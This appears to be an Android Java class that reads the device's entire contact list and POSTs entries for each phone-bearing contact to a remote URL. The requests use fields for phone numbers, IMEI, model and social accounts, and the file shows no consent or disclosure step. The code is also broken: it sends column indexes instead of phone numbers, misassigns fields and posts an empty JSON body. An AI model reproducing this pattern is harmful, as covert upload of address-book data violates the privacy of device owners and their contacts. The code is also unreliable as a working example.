package com.example.cka.smartckeckdata;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.provider.ContactsContract;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class SaveUserCheckData2 {
    public static Context contextOfApplication;
    public static Context getContextOfApplication() {
        return contextOfApplication;
    }
    public static ContentResolver tryGetContentResolver(Context c){
        ContentResolver contentResolver = c.getContentResolver();
        return contentResolver;
    }

    public static String POST(String url) {
        InputStream inputStream = null;
        String result = "";

        final Cursor cur;
        //final ContentResolver cr = getConten.getContentResolver();
        final ContentResolver cr = tryGetContentResolver(getContextOfApplication());

        cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        List<String> lstcontacts = new ArrayList<String>();
        //s'il ya un au moins un contact
        if (cur.getCount() > 0) {
            //je boucle sur les contacts
            while (cur.moveToNext()) {

                //je recupère l'id et le nom du contact
                final String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                //final String nom = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));


                //verification du numero
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor envoi = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "= ?",
                            new String[]{id}, null);
                    //final String x= null;

                    while (envoi.moveToNext()) {
                             try {

                                    // 1. create HttpClient
                                     HttpClient httpclient = new DefaultHttpClient();

                                     // 2. make POST request to the given URL
                                 HttpPost httpPost = new HttpPost(url);

                                 String json = "";


                            EnvoiPost(url,
                                    envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                    envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                    envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                    envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                    "Imei", "version",
                                    "model", "duree", "gmail", "twitter", "fb", "dateins",
                                    "actif", "actif");

                            // 3. build jsonObject
                            /*JSONObject jsonObject = new JSONObject();
                            jsonObject.accumulate("name", person.getName());
                            jsonObject.accumulate("country", person.getCountry());
                            jsonObject.accumulate("twitter", person.getTwitter());*/

                            // 4. convert JSONObject to JSON to String
                            //json = jsonObject.toString();

                            // ** Alternative way to convert Person object to JSON string usin Jackson Lib
                            // ObjectMapper mapper = new ObjectMapper();
                            // json = mapper.writeValueAsString(person);

                            // 5. set json to StringEntity
                            StringEntity se = new StringEntity(json);

                            // 6. set httpPost Entity
                            httpPost.setEntity(se);

                            // 7. Set some headers to inform server about the type of the content
                            httpPost.setHeader("Accept", "application/json");
                            httpPost.setHeader("Content-type", "application/json");

                            // 8. Execute POST request to the given URL
                                // new HttpAsyncTask().execute("http://hmkcode.appspot.com/jsonservlet");
                            HttpResponse httpResponse = httpclient.execute(httpPost);

                            // 9. receive response as inputStream
                            inputStream = httpResponse.getEntity().getContent();

                            // 10. convert inputstream to string
                            if (inputStream != null) {
                                result = convertInputStreamToString(inputStream);
                            }
                            else {
                                result = "Conversion impossible!";
                            }

                        } catch(Exception e){
                            Log.d("InputStream", e.getLocalizedMessage());
                        }



                    }
                }

            }


        }
        // 11. return result
        return result;
    }

    private static String convertInputStreamToString(InputStream inputStream) throws IOException{
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;

        inputStream.close();
        return result;

    }

   /* public boolean isConnected(){
        ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Activity.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected())
            return true;
        else
            return false;
    }*/


    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    public static void EnvoiPost(String Url, int tel1, int tel2,int tell3,int tel4, String imei, String version, String model, String duree_activite,
                                 String gmail, String twitter, String fb, String dat_ins, String etat,String statut) {

        HttpClient client = new DefaultHttpClient();
        HttpPost post = new HttpPost(Url);
        try {
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
            nameValuePairs.add(new BasicNameValuePair("tel1",Integer.toString(tel1)));
            nameValuePairs.add(new BasicNameValuePair("tel2",Integer.toString(tel2)));
            nameValuePairs.add(new BasicNameValuePair("tell3",Integer.toString(tell3)));
            nameValuePairs.add(new BasicNameValuePair("tell4",Integer.toString(tell3)));
            nameValuePairs.add(new BasicNameValuePair("imei",imei));
            nameValuePairs.add(new BasicNameValuePair("version",version));
            nameValuePairs.add(new BasicNameValuePair("model",model));
            nameValuePairs.add(new BasicNameValuePair("duree_activite",duree_activite));
            nameValuePairs.add(new BasicNameValuePair("gmail",gmail));
            nameValuePairs.add(new BasicNameValuePair("twitter",twitter));
            nameValuePairs.add(new BasicNameValuePair("fb",fb));
            nameValuePairs.add(new BasicNameValuePair("dat_ins",dat_ins));
            nameValuePairs.add(new BasicNameValuePair("etat",etat));
            nameValuePairs.add(new BasicNameValuePair("statut",statut));

            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            HttpResponse response = client.execute(post);
            Log.i("reponse est", response.toString());
            /*BufferedReader rd = new BufferedReader(new InputStreamReader(
                    response.getEntity().getContent()));
            String line = "";
            while ((line = rd.readLine()) != null) {
                System.out.println(line);
            }*/

        } catch (IOException e) {
            e.printStackTrace();
        }

    }

}
